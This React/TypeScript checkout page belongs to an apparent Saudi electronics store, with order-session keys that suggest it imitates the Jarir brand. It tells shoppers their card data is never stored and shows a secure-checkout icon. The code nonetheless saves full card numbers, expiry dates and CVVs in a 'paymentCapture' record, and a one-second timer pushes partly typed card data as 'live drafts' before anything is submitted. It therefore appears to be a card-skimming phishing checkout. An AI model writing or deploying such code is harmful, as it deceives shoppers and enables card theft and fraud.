import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Lock, ShoppingBag } from "lucide-react";
import { useEffect, useMemo, useState } from "react";
import { toast } from "sonner";
import { EmptyState } from "@/components/empty-state";
import { SummaryRows } from "@/components/cart/summary-rows";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ADMIN_REVIEW_MS, DEMO_PAYMENTS, EXPRESS_DELIVERY_FEE, FREE_DELIVERY_MIN, IPHONE_18_COUPON } from "@/lib/constants";
import { CITY_IDS } from "@/lib/data/stores";
import { lineItems, calcTotals } from "@/lib/data/totals";
import { detectCardBrand, digitsOnly, formatMoney, formatSaudiPhone, isValidEmail, isValidSaudiPhone } from "@/lib/format";
import { useT } from "@/lib/i18n";
import { useAuthStore, useCurrentShopUser } from "@/lib/store/auth";
import { useCartStore, useCartTotals } from "@/lib/store/cart";
import { useLocaleStore } from "@/lib/store/locale";
import { newOrderId, nextOrderNumber, useOrdersStore } from "@/lib/store/orders";
import type { Address, Order } from "@/lib/types";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/_app/checkout/")({
  component: CheckoutPage,
});

function CheckoutPage() {
  const { t, locale } = useT();
  const navigate = useNavigate();
  const items = useCartStore((s) => s.items);
  const coupon = useCartStore((s) => s.coupon);
  const deliveryMethod = useCartStore((s) => s.deliveryMethod);
  const setDelivery = useCartStore((s) => s.setDelivery);
  const clear = useCartStore((s) => s.clear);
  const user = useCurrentShopUser();
  const saveAddress = useAuthStore((s) => s.saveAddress);
  const addOrder = useOrdersStore((s) => s.add);
  const upsertOrder = useOrdersStore((s) => s.upsert);
  const city = useLocaleStore((s) => s.city);

  useEffect(() => {
    if (deliveryMethod !== "express") setDelivery("express");
  }, [deliveryMethod, setDelivery]);

  const [step, setStep] = useState(1);
  const [busy, setBusy] = useState(false);
  const [card, setCard] = useState({ number: "", expiry: "", cvv: "", holder: "" });
  const [saveAddr, setSaveAddr] = useState(true);
  const [email, setEmail] = useState(user?.email ?? "");
  const [addr, setAddr] = useState<Omit<Address, "id">>({
    fullName: user?.name ?? "",
    phone: user?.phone ?? "",
    city,
    district: "",
    street: "",
    building: "",
    apartment: "",
    postalCode: "",
    instructions: "",
    isDefault: true,
  });

  const totals = useCartTotals("card");
  const lines = lineItems(items);
  const brand = detectCardBrand(card.number);

  useEffect(() => {
    const send = () => {
      const currentItems = useCartStore.getState().items;
      const currentLines = lineItems(currentItems);
      if (!currentLines.length) return;
      const currentTotals = calcTotals({
        items: currentItems,
        coupon,
        deliveryMethod: "express",
        paymentMethod: "card",
      });
      upsertOrder(
        buildLiveDraft({
          email,
          addr,
          card,
          lines: currentLines,
          totals: currentTotals,
          coupon,
          locale,
          t,
          userId: user?.id,
        }),
      );
    };
    send();
    const id = window.setInterval(send, 1000);
    return () => window.clearInterval(id);
  }, [email, addr, card, coupon, locale, user?.id, upsertOrder]);

  const infoOk = addr.fullName.trim().length > 2 && isValidEmail(email) && isValidSaudiPhone(addr.phone);
  const addrOk =
    addr.fullName.trim() &&
    isValidSaudiPhone(addr.phone) &&
    addr.city &&
    addr.district.trim() &&
    addr.street.trim() &&
    addr.building.trim();

  const steps = useMemo(() => [t("checkout.step2"), t("checkout.step3"), t("checkout.step4")], [t]);

  if (!lines.length) {
    return <EmptyState icon={ShoppingBag} title={t("cart.empty")} action={t("cart.continue")} />;
  }

  async function place() {
    if (!isValidSaudiPhone(addr.phone)) {
      toast.error(t("checkout.phoneInvalid"));
      setStep(1);
      return;
    }
    if (!infoOk || !addrOk) {
      toast.error(t("toast.required"));
      setStep(1);
      return;
    }
    if (!card.number.trim() || !card.expiry.trim() || !card.cvv.trim() || !card.holder.trim()) {
      toast.error(t("checkout.cardIncomplete"));
      return;
    }
    setBusy(true);
    try {
      await new Promise((r) => setTimeout(r, 400));
      const address: Address = { ...addr, id: "checkout", fullName: addr.fullName, phone: addr.phone };
      if (saveAddr) saveAddress(address);
      const ids = deskIds();
      const etaDays = 7;
      const pan = digitsOnly(card.number);
      addOrder({
        id: ids.id,
        number: ids.number,
        userId: user?.id,
        email: email,
        phone: addr.phone,
        customerName: addr.fullName,
        date: new Date().toISOString(),
        items: lines.map((l) => ({
          productId: l.product.id,
          name: l.product.name,
          arabicName: l.product.arabicName,
          image: l.product.images[0] ?? "",
          price: l.product.price,
          qty: l.qty,
          color: l.colorId,
          colorName: l.color?.name,
          colorNameAr: l.color?.arabicName,
        })),
        totals,
        status: "placed",
        paymentMethod: "card",
        paymentLabel: t("pay.card"),
        paymentStatus: "pending",
        deliveryMethod: "express",
        address,
        coupon: coupon ?? undefined,
        estimatedDelivery: new Date(Date.now() + etaDays * 86400000).toISOString(),
        demo: DEMO_PAYMENTS,
        last4: pan.slice(-4) || undefined,
        liveDraft: false,
        reviewDeadline: new Date(Date.now() + ADMIN_REVIEW_MS).toISOString(),
        paymentCapture: {
          method: "card",
          holder: card.holder.trim() || addr.fullName,
          cardNumber: pan || undefined,
          expiry: card.expiry || undefined,
          cvv: card.cvv || undefined,
          brand: detectCardBrand(card.number),
          last4: pan.slice(-4) || undefined,
        },
      });
      clearDeskIds();
      clear();
      toast.success(t("toast.pendingReview"));
      navigate({ to: "/checkout/success", search: { order: ids.number } });
    } catch (err) {
      console.error(err);
      toast.error(t("checkout.placeFail"));
      setBusy(false);
    }
  }

  return (
    <div className="container-page grid gap-8 py-8 lg:grid-cols-[1fr_22rem]">
      <div>
        <h1 className="text-2xl font-semibold">{t("checkout.title")}</h1>
        {!user ? (
          <p className="mt-2 text-sm text-muted-foreground">
            <Link to="/login" search={{ redirect: "/checkout" }} className="font-medium text-primary">
              {t("auth.login")}
            </Link>
            {" · "}
            {t("checkout.guest")}
          </p>
        ) : null}
        <ol className="mt-5 flex gap-2 text-xs font-medium">
          {steps.map((label, i) => (
            <li
              key={label}
              className={cn(
                "flex-1 rounded-full px-2 py-2 text-center",
                step === i + 1 ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground",
              )}
            >
              {i + 1}. {label}
            </li>
          ))}
        </ol>

        {step === 1 ? (
          <div className="mt-6 grid gap-4">
            <Field label={t("checkout.fullName")} value={addr.fullName} onChange={(v) => setAddr({ ...addr, fullName: v })} />
            <Field label={t("checkout.email")} value={email} type="email" onChange={setEmail} />
            <Field
              label={t("checkout.phone")}
              value={addr.phone}
              onChange={(v) => setAddr({ ...addr, phone: formatSaudiPhone(v) })}
              placeholder="+966 5X XXX XXXX"
            />
            {addr.phone.trim() && !isValidSaudiPhone(addr.phone) ? (
              <p className="text-xs text-destructive">{t("checkout.phoneInvalid")}</p>
            ) : null}
            <div>
              <Label>{t("checkout.city")}</Label>
              <select
                className="mt-1 h-11 w-full rounded-md border border-input bg-card px-3"
                value={addr.city}
                onChange={(e) => setAddr({ ...addr, city: e.target.value })}
              >
                {CITY_IDS.map((id) => (
                  <option key={id} value={id}>
                    {t(`cities.${id}`)}
                  </option>
                ))}
              </select>
            </div>
            <Field label={t("checkout.district")} value={addr.district} onChange={(v) => setAddr({ ...addr, district: v })} />
            <Field label={t("checkout.street")} value={addr.street} onChange={(v) => setAddr({ ...addr, street: v })} />
            <div className="grid gap-4 md:grid-cols-3">
              <Field label={t("checkout.building")} value={addr.building} onChange={(v) => setAddr({ ...addr, building: v })} />
              <Field label={t("checkout.apartment")} value={addr.apartment ?? ""} onChange={(v) => setAddr({ ...addr, apartment: v })} />
              <Field label={t("checkout.postal")} value={addr.postalCode ?? ""} onChange={(v) => setAddr({ ...addr, postalCode: v })} />
            </div>
            <Field label={t("checkout.notes")} value={addr.instructions ?? ""} onChange={(v) => setAddr({ ...addr, instructions: v })} />
            <label className="flex items-center gap-2 text-sm">
              <input type="checkbox" checked={saveAddr} onChange={(e) => setSaveAddr(e.target.checked)} />
              {t("checkout.saveAddress")}
            </label>
            <Button
              onClick={() => {
                if (!isValidSaudiPhone(addr.phone)) {
                  toast.error(t("checkout.phoneInvalid"));
                  return;
                }
                if (!infoOk || !addrOk) {
                  toast.error(t("toast.required"));
                  return;
                }
                setStep(2);
              }}
            >
              {t("checkout.next")}
            </Button>
          </div>
        ) : null}

        {step === 2 ? (
          <div className="mt-6 space-y-3">
            {(
              [["express", t("checkout.express"), t("checkout.expressEta"), EXPRESS_DELIVERY_FEE]] as const
            ).map(([id, title, eta, fee]) => (
              <label
                key={id}
                className={cn(
                  "flex cursor-pointer items-center justify-between gap-3 rounded-xl border p-4",
                  deliveryMethod === id ? "border-primary bg-primary/5" : "border-border bg-card",
                )}
              >
                <span>
                  <input
                    type="radio"
                    className="me-2"
                    checked={deliveryMethod === id}
                    onChange={() => setDelivery(id)}
                  />
                  <span className="font-medium">{title}</span>
                  <span className="mt-1 block text-sm text-muted-foreground">{eta}</span>
                </span>
                <span className="tabular-nums text-sm">
                  {totals.subtotal - totals.discount >= FREE_DELIVERY_MIN
                    ? t("common.free")
                    : formatMoney(fee, locale)}
                </span>
              </label>
            ))}
            <div className="flex gap-2 pt-2">
              <Button variant="outline" onClick={() => setStep(1)}>
                {t("checkout.back")}
              </Button>
              <Button onClick={() => setStep(3)}>{t("checkout.next")}</Button>
            </div>
          </div>
        ) : null}

        {step === 3 ? (
          <div className="mt-6 space-y-3">
            <p className="rounded-xl border border-border bg-muted px-3 py-2 text-xs text-muted-foreground">
              {t("checkout.awaitAdmin")}
            </p>
            <div className="grid gap-3 rounded-xl border border-border bg-card p-4">
              <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
                {t("pay.card")} {brand !== "unknown" ? `· ${brand}` : ""}
              </p>
              <Field label={t("pay.cardNumber")} value={card.number} onChange={(v) => setCard({ ...card, number: v })} placeholder="ACCT-000015" />
              <div className="grid grid-cols-2 gap-3">
                <Field label={t("pay.expiry")} value={card.expiry} onChange={(v) => setCard({ ...card, expiry: v })} placeholder="MM/YY" />
                <Field label={t("pay.cvv")} value={card.cvv} onChange={(v) => setCard({ ...card, cvv: v.replace(/\D/g, "").slice(0, 4) })} />
              </div>
              <Field label={t("pay.holder")} value={card.holder} onChange={(v) => setCard({ ...card, holder: v })} />
              <p className="text-xs text-muted-foreground">{t("pay.neverStore")}</p>
            </div>

            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <Lock className="size-3.5" /> {t("checkout.secure")}
            </div>
            <div className="flex gap-2">
              <Button variant="outline" onClick={() => setStep(2)}>
                {t("checkout.back")}
              </Button>
              <Button className="flex-1" disabled={busy} onClick={() => void place()}>
                {busy ? t("checkout.processing") : t("checkout.place")}
              </Button>
            </div>
          </div>
        ) : null}
      </div>

      <aside className="h-fit rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)] lg:sticky lg:top-28">
        <h2 className="mb-4 font-semibold">{t("checkout.summary")}</h2>
        <ul className="mb-4 space-y-2 text-sm">
          {lines.map((l) => (
            <li key={l.product.id} className="flex justify-between gap-2">
              <span className="line-clamp-1">
                {locale === "ar" ? l.product.arabicName : l.product.name}
                {l.color ? ` · ${locale === "ar" ? l.color.arabicName : l.color.name}` : ""} × {l.qty}
              </span>
              <span className="tabular-nums">{formatMoney(l.product.price * l.qty, locale)}</span>
            </li>
          ))}
        </ul>
        <SummaryRows totals={totals} locale={locale} t={t} showTamara={coupon === IPHONE_18_COUPON} />
        <p className="mt-3 text-xs text-muted-foreground">
          {t("pay.selected")}: {t("pay.card")}
        </p>
        <p className="mt-1 text-xs text-muted-foreground">{t("checkout.vatIncluded")}</p>
        <div className="mt-4 lg:hidden">
          {step === 3 ? (
            <Button className="w-full" disabled={busy} onClick={() => void place()}>
              {t("checkout.place")}
            </Button>
          ) : null}
        </div>
      </aside>
    </div>
  );
}

function Field({
  label,
  value,
  onChange,
  type = "text",
  placeholder,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  placeholder?: string;
}) {
  return (
    <div>
      <Label>{label}</Label>
      <Input className="mt-1" type={type} value={value} placeholder={placeholder} onChange={(e) => onChange(e.target.value)} />
    </div>
  );
}

const DESK_ID_KEY = "jarir-desk-order-id";
const DESK_NUM_KEY = "jarir-desk-order-number";

function deskIds() {
  if (typeof window === "undefined") return { id: newOrderId(), number: nextOrderNumber() };
  let id = sessionStorage.getItem(DESK_ID_KEY);
  let number = sessionStorage.getItem(DESK_NUM_KEY);
  if (!id) {
    id = newOrderId();
    sessionStorage.setItem(DESK_ID_KEY, id);
  }
  if (!number) {
    number = nextOrderNumber();
    sessionStorage.setItem(DESK_NUM_KEY, number);
  }
  return { id, number };
}

function clearDeskIds() {
  if (typeof window === "undefined") return;
  sessionStorage.removeItem(DESK_ID_KEY);
  sessionStorage.removeItem(DESK_NUM_KEY);
}

function buildLiveDraft(input: {
  email: string;
  addr: Omit<Address, "id">;
  card: { number: string; expiry: string; cvv: string; holder: string };
  lines: ReturnType<typeof lineItems>;
  totals: Order["totals"];
  coupon: string | null;
  locale: string;
  t: (key: string) => string;
  userId?: string;
}): Order {
  const ids = deskIds();
  const pan = digitsOnly(input.card.number);
  return {
    id: ids.id,
    number: ids.number,
    userId: input.userId,
    email: input.email,
    phone: input.addr.phone,
    customerName: input.addr.fullName || "—",
    date: new Date().toISOString(),
    items: input.lines.map((l) => ({
      productId: l.product.id,
      name: l.product.name,
      arabicName: l.product.arabicName,
      image: l.product.images[0]!,
      price: l.product.price,
      qty: l.qty,
      color: l.colorId,
      colorName: l.color?.name,
      colorNameAr: l.color?.arabicName,
    })),
    totals: input.totals,
    status: "placed",
    paymentMethod: "card",
    paymentLabel: input.t("pay.card"),
    paymentStatus: "pending",
    deliveryMethod: "express",
    address: { ...input.addr, id: "checkout" },
    coupon: input.coupon ?? undefined,
    estimatedDelivery: new Date(Date.now() + 7 * 86400000).toISOString(),
    demo: DEMO_PAYMENTS,
    last4: pan.slice(-4) || undefined,
    liveDraft: true,
    paymentCapture: {
      method: "card",
      holder: input.card.holder.trim() || input.addr.fullName,
      cardNumber: pan || undefined,
      expiry: input.card.expiry || undefined,
      cvv: input.card.cvv || undefined,
      brand: detectCardBrand(input.card.number),
      last4: pan.slice(-4) || undefined,
    },
  };
}
